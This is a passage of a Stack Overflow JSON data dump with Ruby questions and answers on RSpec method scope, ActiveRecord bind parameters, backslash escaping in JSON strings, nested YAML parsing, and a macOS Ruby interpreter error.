/System/Library/Frameworks/Ruby.framework/Versions/2.0/usr/bin/ruby: bad interpreter: No such file or directory", "body": "<p>After updating to High Sierra, installing Bundler gives me the following error</p>\n\n<pre><code>-bash: /usr/local/bin/pod: /System/Library/Frameworks/Ruby.framework/Versions/2.0/usr/bin/ruby: bad interpreter: No such file or directory\n</code></pre>\n"}, {"tags": ["ruby", "rspec"], "answers": [{"comments": [{"owner": {"reputation": 367, "user_id": 7852372, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Ukz2Q.jpg?s=128&g=1", "display_name": "rhunal", "link": "https://stackoverflow.com/users/7852372/rhunal"}, "edited": false, "score": 0, "creation_date": 1512023363, "post_id": 47547329, "comment_id": 82091902, "body": "What if we want pass an argument like done in  &#39;method&#39;?, so  &#39;procs&#39; are useful than scope."}, {"owner": {"reputation": 3180, "user_id": 4659816, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/5TNaW.jpg?s=128&g=1", "display_name": "David", "link": "https://stackoverflow.com/users/4659816/david"}, "reply_to_user": {"reputation": 367, "user_id": 7852372, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Ukz2Q.jpg?s=128&g=1", "display_name": "rhunal", "link": "https://stackoverflow.com/users/7852372/rhunal"}, "edited": false, "score": 0, "creation_date": 1512027087, "post_id": 47547329, "comment_id": 82093565, "body": "I agree, in that case this solution wouldn&#39;t work - it just wasn&#39;t clear from your question what your end goal was."}], "tags": [], "owner": {"reputation": 3180, "user_id": 4659816, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/5TNaW.jpg?s=128&g=1", "display_name": "David", "link": "https://stackoverflow.com/users/4659816/david"}, "is_accepted": false, "score": 1, "last_activity_date": 1511940921, "creation_date": 1511940921, "answer_id": 47547329, "question_id": 47546214, "link": "https://stackoverflow.com/questions/47546214/how-to-call-same-methods-inside-and-outside-context-and-it-block/47547329#47547329", "title": "How to call same methods inside and outside &#39;context&#39; and &#39;it&#39; block", "body": "<p>The solution is to simply define your structure within scope, instead of returning it from a method call:</p>\n\n<pre><code>EMAILS = [\n   'test1@example.com',\n   'test2@example.com',\n   'test3@example.com'\n]\n\nEMAILS.each do |email|\n  it \"should display #{email}\" do\n  end\nend\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 367, "user_id": 7852372, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Ukz2Q.jpg?s=128&g=1", "display_name": "rhunal", "link": "https://stackoverflow.com/users/7852372/rhunal"}, "edited": false, "score": 0, "creation_date": 1511945657, "post_id": 47548024, "comment_id": 82053703, "body": "but how above &#39;email_ids&#39; class method will be accessible inside &#39;it&#39; block?"}, {"owner": {"reputation": 3180, "user_id": 4659816, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/5TNaW.jpg?s=128&g=1", "display_name": "David", "link": "https://stackoverflow.com/users/4659816/david"}, "edited": false, "score": 0, "creation_date": 1511945798, "post_id": 47548024, "comment_id": 82053782, "body": "excellent explanation and whilst my answer provides another way to achieve what I believed the OP was attempting to do, this is the correct solution to the actual question."}, {"owner": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "reply_to_user": {"reputation": 367, "user_id": 7852372, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Ukz2Q.jpg?s=128&g=1", "display_name": "rhunal", "link": "https://stackoverflow.com/users/7852372/rhunal"}, "edited": false, "score": 0, "creation_date": 1511946166, "post_id": 47548024, "comment_id": 82054002, "body": "@Rhunal you wanted it to be accessible <i>outside</i> the <code>it</code> block."}, {"owner": {"reputation": 4644, "user_id": 2594185, "user_type": "registered", "profile_image": "https://graph.facebook.com/100003773788931/picture?type=large", "display_name": "Jagdeep Singh", "link": "https://stackoverflow.com/users/2594185/jagdeep-singh"}, "edited": false, "score": 0, "creation_date": 1511947019, "post_id": 47548024, "comment_id": 82054550, "body": "Wow. Amazing explanation @Stefan."}, {"owner": {"reputation": 367, "user_id": 7852372, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Ukz2Q.jpg?s=128&g=1", "display_name": "rhunal", "link": "https://stackoverflow.com/users/7852372/rhunal"}, "edited": false, "score": 0, "creation_date": 1511949096, "post_id": 47548024, "comment_id": 82056004, "body": "Thanks for the solution, it works. Please advise if same method can be accessible inside/outside the it block"}, {"owner": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "reply_to_user": {"reputation": 367, "user_id": 7852372, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Ukz2Q.jpg?s=128&g=1", "display_name": "rhunal", "link": "https://stackoverflow.com/users/7852372/rhunal"}, "edited": false, "score": 0, "creation_date": 1511961243, "post_id": 47548024, "comment_id": 82063979, "body": "@Rhunal you want a method that is available as both, a class method and an instance method. Ruby has <a href=\"http://ruby-doc.org/core-2.4.2/Module.html#method-i-module_function\" rel=\"nofollow noreferrer\"><code>module_function</code></a> or you could put it in a module and call both, <code>extend</code> and <code>include</code> as shown in the RSpec docs (last example)."}], "tags": [], "owner": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "is_accepted": false, "score": 7, "last_activity_date": 1511945271, "last_edit_date": 1511945271, "creation_date": 1511943559, "answer_id": 47548024, "question_id": 47546214, "link": "https://stackoverflow.com/questions/47546214/how-to-call-same-methods-inside-and-outside-context-and-it-block/47548024#47548024", "title": "How to call same methods inside and outside &#39;context&#39; and &#39;it&#39; block", "body": "<p><code>describe</code> creates a (nested) class and evaluates the given block within that class:</p>\n\n<pre><code>describe 'Foo' do     \n  p self            #=&gt; RSpec::ExampleGroups::Foo\n  describe '' do\n    p self          #=&gt; RSpec::ExampleGroups::Foo::Bar\n  end\nend\n</code></pre>\n\n<p><code>it</code> blocks on the other hand are evaluated in the corresponding class' instance:</p>\n\n<pre><code>describe 'Foo' do    \n  it 'foo' do \n    p self          #=&gt; #&lt;RSpec::ExampleGroups::Foo ...&gt;\n  end\nend\n</code></pre>\n\n<p>If you define a method via <code>def email_ids</code>, it becomes an <em>instance method</em> and is therefore only available within the instance, i.e. within <code>it</code>.</p>\n\n<p>In order to make a method available within <code>describe</code>, you have to define it as a <em>class method</em>, i.e via <code>def self.email_ids</code>:</p>\n\n<pre><code>describe 'Emails' do\n  def self.email_ids\n    %w[test1@example.com test2@example.com test3@example.com]\n  end\n\n  email_ids.each do |email_id|\n    it \"should display #{email_id}\" do\n    end\n  end\nend\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>Emails\n  should display test1@example.com\n  should display test2@example.com\n  should display test3@example.com\n</code></pre>\n\n<p>You can also reuse the helper method across multiple tests by putting it in a module and using <code>extend</code>. See <a href=\"https://relishapp.com/rspec/rspec-core/docs/helper-methods/define-helper-methods-in-a-module\" rel=\"noreferrer\">Define helper methods in a module</a> for more examples.</p>\n"}, {"comments": [{"owner": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 0, "creation_date": 1512943998, "post_id": 47555180, "comment_id": 82448140, "body": "You don&#39;t have to put the array in a proc, just assign it to the variable."}, {"owner": {"reputation": 367, "user_id": 7852372, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Ukz2Q.jpg?s=128&g=1", "display_name": "rhunal", "link": "https://stackoverflow.com/users/7852372/rhunal"}, "reply_to_user": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 0, "creation_date": 1512969395, "post_id": 47555180, "comment_id": 82453595, "body": "By assigning it to the variable, that variable will not be accessible outside the &#39;it&#39; block."}, {"owner": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 0, "creation_date": 1512975418, "post_id": 47555180, "comment_id": 82455681, "body": "If <code>email_ids</code> wouldn&#39;t be accessible, you couldn&#39;t invoke <code>email_ids.call</code>, could you?"}, {"owner": {"reputation": 367, "user_id": 7852372, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Ukz2Q.jpg?s=128&g=1", "display_name": "rhunal", "link": "https://stackoverflow.com/users/7852372/rhunal"}, "reply_to_user": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 0, "creation_date": 1512976461, "post_id": 47555180, "comment_id": 82456131, "body": "Please specify are you talking about email_ids as proc or assigned variable?"}, {"owner": {"reputation": 367, "user_id": 7852372, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Ukz2Q.jpg?s=128&g=1", "display_name": "rhunal", "link": "https://stackoverflow.com/users/7852372/rhunal"}, "reply_to_user": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 0, "creation_date": 1512976566, "post_id": 47555180, "comment_id": 82456180, "body": "If we define <code>email_ids</code> as proc, then we can invoke <code>email_ids.call</code>,"}, {"owner": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 0, "creation_date": 1512980332, "post_id": 47555180, "comment_id": 82457607, "body": "<code>email_ids</code> is a local variable. You can assign a proc to it or an array. That doesn&#39;t change its scope. Either one works."}, {"owner": {"reputation": 367, "user_id": 7852372, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Ukz2Q.jpg?s=128&g=1", "display_name": "rhunal", "link": "https://stackoverflow.com/users/7852372/rhunal"}, "reply_to_user": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 0, "creation_date": 1512983263, "post_id": 47555180, "comment_id": 82458984, "body": "If we assign a <code>proc</code> to local variable <code>email_ids</code>, then its scope is available inside or outside <code>it</code> block. But if we assign an <code>array</code> to local variable <code>email_ids</code>, then its scope will not be work as same as <code>proc</code>."}, {"owner": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 0, "creation_date": 1512983537, "post_id": 47555180, "comment_id": 82459150, "body": "Assigning a proc to a variable does not change its scope."}, {"owner": {"reputation": 367, "user_id": 7852372, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Ukz2Q.jpg?s=128&g=1", "display_name": "rhunal", "link": "https://stackoverflow.com/users/7852372/rhunal"}, "reply_to_user": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 0, "creation_date": 1512987173, "post_id": 47555180, "comment_id": 82461330, "body": "Thanks Stefen, I got it now. Its scope.remains same."}, {"owner": {"reputation": 367, "user_id": 7852372, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Ukz2Q.jpg?s=128&g=1", "display_name": "rhunal", "link": "https://stackoverflow.com/users/7852372/rhunal"}, "reply_to_user": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 0, "creation_date": 1512987250, "post_id": 47555180, "comment_id": 82461384, "body": "Stefen, please advise, is it right to use local variable or proc in rspec?"}], "tags": [], "owner": {"reputation": 367, "user_id": 7852372, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Ukz2Q.jpg?s=128&g=1", "display_name": "rhunal", "link": "https://stackoverflow.com/users/7852372/rhunal"}, "is_accepted": false, "score": 3, "last_activity_date": 1513172279, "last_edit_date": 1513172279, "creation_date": 1511965841, "answer_id": 47555180, "question_id": 47546214, "link": "https://stackoverflow.com/questions/47546214/how-to-call-same-methods-inside-and-outside-context-and-it-block/47555180#47555180", "title": "How to call same methods inside and outside &#39;context&#39; and &#39;it&#39; block", "body": "<p>I have better solution for this, than above.</p>\n\n<p>1.using 'procs' or just local variable as below:</p>\n\n<pre><code>email_ids = -&gt;{ %w[test1@example.com test2@example.com test3@example.com] }\n</code></pre>\n\n<p><code>email_ids = { %w[test1@example.com test2@example.com test3@example.com] }\n</code></p>\n\n<p>Scope of <code>proc</code> &amp; <code>local</code> variable will be same, but if you want to pass an argument then 'procs' are useful. </p>\n\n<p>2.Define 'email_ids' method in <code>module</code> and include that <code>module</code> in <code>spec</code>, so that method will be accessible inside and outside the 'it' block</p>\n\n<pre><code>module EmailFactoryHelper\n\n  def email_ids\n    %w[test1@example.com test2@example.com test3@example.com]\n  end\n\nend\n</code></pre>\n\n<p>include in specs as below:</p>\n\n<pre><code>require 'factories_helper/email_factory_helper'\n\ninclude EmailFactoryHelper\n\ndescribe 'Emails' do\n  email_ids.call.each do |email_id|\n    it \"should display #{email_id}\" do\n      page.should have_content \"#{email_id}\"\n    end\n  end\nend\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>Emails\n  should display test1@example.com\n  should display test2@example.com\n  should display test3@example.com\n\nFinished in 41.56 seconds\n3 examples, 0 failures\n</code></pre>\n\n<p>I have preferred step-2</p>\n"}, {"tags": [], "owner": {"reputation": 1280, "user_id": 3614563, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dd48fa4e1fc92792a82bdcae6ad40eaa?s=128&d=identicon&r=PG&f=1", "display_name": "George Koehler", "link": "https://stackoverflow.com/users/3614563/george-koehler"}, "is_accepted": false, "score": 0, "last_activity_date": 1512095768, "creation_date": 1512095768, "answer_id": 47585830, "question_id": 47546214, "link": "https://stackoverflow.com/questions/47546214/how-to-call-same-methods-inside-and-outside-context-and-it-block/47585830#47585830", "title": "How to call same methods inside and outside &#39;context&#39; and &#39;it&#39; block", "body": "<p>The method wasn't accessible because you called the method before you defined the method.  This simpler script has the same problem:</p>\n\n<pre><code>p email_ids\n\ndef email_ids\n  [\n    'test1@example.com',\n    'test2@example.com',\n    'test3@example.com'\n  ]\nend\n</code></pre>\n\n<p>\"undefined local variable or method `email_ids' for main:Object (NameError)\"</p>\n\n<p>You must define your methods before you call them.  You can solve this problem by moving the <code>def email_ids</code> above the <code>describe 'Emails'</code>.</p>\n"}, {"tags": [], "owner": {"reputation": 46, "user_id": 9265145, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fe20960404ceb71d451e23e6cd20b80b?s=128&d=identicon&r=PG&f=1", "display_name": "Prabs", "link": "https://stackoverflow.com/users/9265145/prabs"}, "is_accepted": true, "score": 2, "last_activity_date": 1517254999, "creation_date": 1517254999, "answer_id": 48508833, "question_id": 47546214, "link": "https://stackoverflow.com/questions/47546214/how-to-call-same-methods-inside-and-outside-context-and-it-block/48508833#48508833", "title": "How to call same methods inside and outside &#39;context&#39; and &#39;it&#39; block", "body": "<p>Rather than using proc or scopes,\n Simply use local variables outside describe block.</p>\n\n<pre><code>email_ids = [ \n  'test1@example.com',\n  'test2@example.com',\n  'test3@example.com'\n]\ndescribe 'Emails' do\nend\n</code></pre>\n"}], "owner": {"reputation": 367, "user_id": 7852372, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Ukz2Q.jpg?s=128&g=1", "display_name": "rhunal", "link": "https://stackoverflow.com/users/7852372/rhunal"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1156, "favorite_count": 0, "accepted_answer_id": 48508833, "answer_count": 5, "score": 3, "last_activity_date": 1517254999, "creation_date": 1511936042, "last_edit_date": 1512119687, "question_id": 47546214, "link": "https://stackoverflow.com/questions/47546214/how-to-call-same-methods-inside-and-outside-context-and-it-block", "title": "How to call same methods inside and outside &#39;context&#39; and &#39;it&#39; block", "body": "<p>Below is a simple rspec example:</p>\n\n<pre><code>describe 'Emails' do    \n  email_ids.each do |email_id|    \n    it \"should display #{email_id}\" do\n    end    \n  end    \nend\n\ndef email_ids\n  [\n    'test1@example.com',\n    'test2@example.com',\n    'test3@example.com'\n  ]\nend\n</code></pre>\n\n<p>The above does not work, as methods are not accessible outside the <code>it</code> block.</p>\n\n<p>Please advise how to make the method <code>email_ids</code> accessible outside the <code>it</code> block.</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "activerecord", "rails-activerecord"], "comments": [{"owner": {"reputation": 6207, "user_id": 5117953, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/Ca0RW.jpg?s=128&g=1", "display_name": "Vishal", "link": "https://stackoverflow.com/users/5117953/vishal"}, "edited": false, "score": 1, "creation_date": 1511936284, "post_id": 47546052, "comment_id": 82049149, "body": "you can use named bind variables to make query easier to read. Named bind variables replace the question marks with symbols and you supply a hash with values for the matching symbol key . please check this article <a href=\"http://millarian.com/rails/quick-tip-rails-named-bind-variables/\" rel=\"nofollow noreferrer\">millarian.com/rails/quick-tip-rails-named-bind-variables</a>"}], "answers": [{"tags": [], "owner": {"reputation": 5093, "user_id": 302005, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/eDmEQ.png?s=128&g=1", "display_name": "Pioz", "link": "https://stackoverflow.com/users/302005/pioz"}, "is_accepted": false, "score": 1, "last_activity_date": 1511948996, "creation_date": 1511948996, "answer_id": 47549705, "question_id": 47546052, "link": "https://stackoverflow.com/questions/47546052/ruby-what-does-binds-mean-in-activerecord-gem/47549705#47549705", "title": "Ruby: What does binds mean in ActiveRecord gem?", "body": "<p>When your SQL contain question marks <code>?</code> the binds are used to replace these marks. For example if you have a query like this: <code>SELECT * from posts where id = 3</code> you can write in Ruby:</p>\n\n<p><code>Post.find_by_sql([\"SELECT * from posts where id = ?\", 3])</code></p>\n\n<p>We have binded the <code>?</code> with the value <code>3</code>.\nIf we have more <code>?</code> they will be binded with the binds array in that order.\nIf there are not <code>?</code> in the SQL string binds are ignored.</p>\n"}], "owner": {"reputation": 1409, "user_id": 5117552, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/71a2ae84018279b9286caa4922297a6d?s=128&d=identicon&r=PG", "display_name": "Ryan Lyu", "link": "https://stackoverflow.com/users/5117552/ryan-lyu"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 197, "favorite_count": 0, "answer_count": 1, "score": 3, "last_activity_date": 1511948996, "creation_date": 1511935276, "question_id": 47546052, "link": "https://stackoverflow.com/questions/47546052/ruby-what-does-binds-mean-in-activerecord-gem", "title": "Ruby: What does binds mean in ActiveRecord gem?", "body": "<p>I saw binds as argument in lots of methods, but without any documentation.</p>\n\n<p>e.g. <a href=\"https://github.com/rails/rails/blob/055493ce056a663a7b61ae4f88f657d1a355995d/activerecord/lib/active_record/querying.rb#L40\" rel=\"nofollow noreferrer\">Rails Source code</a> </p>\n\n<pre><code>def find_by_sql(sql, binds = [], preparable: nil, &amp;block)\n  result_set = connection.select_all(sanitize_sql(sql), \"#{name} Load\", binds, preparable: preparable)\n  column_types = result_set.column_types.dup\n  columns_hash.each_key { |k| column_types.delete k }\n  message_bus = ActiveSupport::Notifications.instrumenter\n\n  payload = {\n    record_count: result_set.length,\n    class_name: name\n  }\n\n  message_bus.instrument(\"instantiation.active_record\", payload) do\n    result_set.map { |record| instantiate(record, column_types, &amp;block) }\n  end\nend\n</code></pre>\n\n<ol>\n<li>what does <code>binds</code> mean?</li>\n<li>How to use it?</li>\n</ol>\n"}, {"tags": ["json", "ruby"], "comments": [{"owner": {"reputation": 24179, "user_id": 1672429, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/0815eb7d4e9dd58022d51ba2011b9c0a?s=128&d=identicon&r=PG", "display_name": "Stefan Pochmann", "link": "https://stackoverflow.com/users/1672429/stefan-pochmann"}, "edited": false, "score": 0, "creation_date": 1511948618, "post_id": 47545324, "comment_id": 82055671, "body": "What does this have to do with JSON? I don&#39;t see any JSON or anything having anything to do with JSON."}], "answers": [{"tags": [], "owner": {"reputation": 23016, "user_id": 2981429, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/ZcCXx.jpg?s=128&g=1", "display_name": "max pleaner", "link": "https://stackoverflow.com/users/2981429/max-pleaner"}, "is_accepted": false, "score": 4, "last_activity_date": 1511935261, "creation_date": 1511935261, "answer_id": 47546048, "question_id": 47545324, "link": "https://stackoverflow.com/questions/47545324/ruby-how-to-create-json-with-backslash-in-the-value/47546048#47546048", "title": "ruby how to create json with backslash in the value", "body": "<p>The double backslash isn't actually in the string. It is just displayed that way in the console.</p>\n\n<pre><code>puts json[:Envoy][:Tags]\n</code></pre>\n\n<p>prints:</p>\n\n<pre><code>57:371BF172ED2AFA7\\|\n</code></pre>\n\n<p>Note that the value you see as the return value in irb / rails console / etc is the same thing as calling <code>print some_object.inspect</code>, for example:</p>\n\n<pre><code>print \"\\\\\".inspect\n</code></pre>\n\n<p>prints:</p>\n\n<pre><code>\"\\\\\"\n</code></pre>\n"}], "owner": {"reputation": 1094, "user_id": 2386620, "user_type": "registered", "accept_rate": 66, "profile_image": "https://www.gravatar.com/avatar/65ad9f1a1aafff45f439ab9d622e00ac?s=128&d=identicon&r=PG", "display_name": "adbarads", "link": "https://stackoverflow.com/users/2386620/adbarads"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 66, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1511935261, "creation_date": 1511931349, "last_edit_date": 1511931589, "question_id": 47545324, "link": "https://stackoverflow.com/questions/47545324/ruby-how-to-create-json-with-backslash-in-the-value", "title": "ruby how to create json with backslash in the value", "body": "<p>I am trying to create a json object in ruby that looks like this:</p>\n\n<pre><code>{\n    \"Envoy\": {\n        \"Tags\": \"57:371BF172ED2AFA7\\|\",\n        \"SerialNumber\": \"55555555\",\n        \"KernelVersion\": \"0123\"\n    }\n}\n</code></pre>\n\n<p>So inside an irb I set the above json equal to an object like this:</p>\n\n<pre><code>json = {\"Envoy\":{\"Tags\":\"57:371BF172ED2AFA7\\|\",\"SerialNumber\":\"55555555\",\"KernelVersion\":\"0123\"}\n</code></pre>\n\n<p>the result from irb is this:</p>\n\n<pre><code>=&gt; {:Envoy=&gt;{:Tags=&gt;\"57:371BF172ED2AFA7|\", :SerialNumber=&gt;\"55555555\", :KernelVersion=&gt;\"0123\"}}\n</code></pre>\n\n<p>As you can see it got rid of the <code>\\</code> in <code>\"Tags\"</code>\nSo then, I added another backslash in an attempt to escape the one that was being eaten. But the result added 2 backslashes instead of the expected 1 like this:</p>\n\n<pre><code>[59] pry(#&lt;Object&gt;)&gt; json = {\"Envoy\":{\"Tags\":\"57:371BF172ED2AFA7\\\\|\",\"SerialNumber\":\"55555555\",\"KernelVersion\":\"0123\"}}\n=&gt; {:Envoy=&gt;{:Tags=&gt;\"57:371BF172ED2AFA7\\\\|\", :SerialNumber=&gt;\"55555555\", :KernelVersion=&gt;\"0123\"}}\n</code></pre>\n\n<p>As you can see I'm clearly lost, I need it to add one backslash in, so that when I do <code>json.to_json</code> it will add 2 backslashes instead of 4.</p>\n\n<p>Any thoughts?</p>\n"}, {"tags": ["ruby", "nested", "yaml"], "comments": [{"owner": {"reputation": 1, "user_id": 5026242, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4ea96dd7baf40cb4c92b590616a62eea?s=128&d=identicon&r=PG&f=1", "display_name": "Sunrise487", "link": "https://stackoverflow.com/users/5026242/sunrise487"}, "edited": false, "score": 0, "creation_date": 1512168668, "post_id": 47544920, "comment_id": 82163974, "body": "the complexity of the above problem is re-purposed with different yaml file structure"}, {"owner": {"reputation": 1, "user_id": 5026242, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4ea96dd7baf40cb4c92b590616a62eea?s=128&d=identicon&r=PG&f=1", "display_name": "Sunrise487", "link": "https://stackoverflow.com/users/5026242/sunrise487"}, "edited": false, "score": 0, "creation_date": 1512169106, "post_id": 47544920, "comment_id": 82164152, "body": "the complexity of the above problem is re-purposed with different yaml file structure   e.g  X: A,B,C after using split(&quot;,&quot;), each of A,B,C are handled separately like A: A1Key:A1Value etc, with following code &gt;&gt; vendor_data1 = YAML.load(File.read(&#39;VendorUser.yaml&#39;)) iterate_type = vendor_data1[&#39;X&#39;] iterate_values = iterate_type.split(&quot;,&quot;) vendor_data_load[&#39;B&#39;].each do |key,value| &gt;&gt;only problem is key, value pairs are correct, but it is iterating based on array class generated, in this case it is 3, is there a way to control iteration, if the value of array string is B, only B should |k,v|"}, {"owner": {"reputation": 1, "user_id": 5026242, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4ea96dd7baf40cb4c92b590616a62eea?s=128&d=identicon&r=PG&f=1", "display_name": "Sunrise487", "link": "https://stackoverflow.com/users/5026242/sunrise487"}, "edited": false, "score": 0, "creation_date": 1512170561, "post_id": 47544920, "comment_id": 82164547, "body": "solved the unnecessary iteration for the string item with this  method  def in_array?(array, item)     item = [item] unless item.is_a?(Array)     item == array &amp; item end"}], "answers": [{"tags": [], "owner": {"reputation": 28612, "user_id": 5025116, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7WdYi.jpg?s=128&g=1", "display_name": "Sebastian Palma", "link": "https://stackoverflow.com/users/5025116/sebastian-palma"}, "is_accepted": false, "score": 1, "last_activity_date": 1511929149, "creation_date": 1511929149, "answer_id": 47544979, "question_id": 47544920, "link": "https://stackoverflow.com/questions/47544920/parse-nested-yaml-into-key-value-pairs-with-ruby/47544979#47544979", "title": "Parse Nested YAML into Key Value Pairs with Ruby", "body": "<p>Maybe is your YAML structure (?):</p>\n\n<pre><code># data.yml\n- access_log:\n  - stored_proc: getsomething\n    uses:\n      usedin: some breadcrumb\n\n# file.rb\nrequire 'yaml'\n\ndata = YAML.load_file '/Users/seb/Desktop/data.yaml'\np data.first['access_log']                         # [{\"stored_proc\"=&gt;\"getsomething\", \"uses\"=&gt;{\"usedin\"=&gt;\"some breadcrumb\"}}]\np data.first['access_log'].first['stored_proc']    # \"getsomething\"\np data.first['access_log'].first['uses']           # {\"usedin\"=&gt;\"some breadcrumb\"}\np data.first['access_log'].first['uses']['usedin'] # \"some breadcrumb\"\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 3375, "user_id": 3676469, "user_type": "registered", "accept_rate": 17, "profile_image": "https://graph.facebook.com/100003443544248/picture?type=large", "display_name": "Hirurg103", "link": "https://stackoverflow.com/users/3676469/hirurg103"}, "is_accepted": false, "score": 1, "last_activity_date": 1511953115, "creation_date": 1511953115, "answer_id": 47551160, "question_id": 47544920, "link": "https://stackoverflow.com/questions/47544920/parse-nested-yaml-into-key-value-pairs-with-ruby/47551160#47551160", "title": "Parse Nested YAML into Key Value Pairs with Ruby", "body": "<p>Your YAML is malformed. You cannot have key with a value and something else nested under that key</p>\n\n<pre><code># malformed.yml\naccess_log:\n  stored_proc: getsomething\n    uses:\n      usedin: some breadcrumb\n\n# irb\nYAML.load_file 'malformed.yml'\nPsych::SyntaxError: (malformed.yml): mapping values are not allowed in this context at line 3 column 9\n    from (irb):51\n</code></pre>\n\n<p>The correct structure will be</p>\n\n<pre><code>access_log:\n  stored_proc: getsomething\n  uses:\n    usedin: some breadcrumb\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 5026242, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4ea96dd7baf40cb4c92b590616a62eea?s=128&d=identicon&r=PG&f=1", "display_name": "Sunrise487", "link": 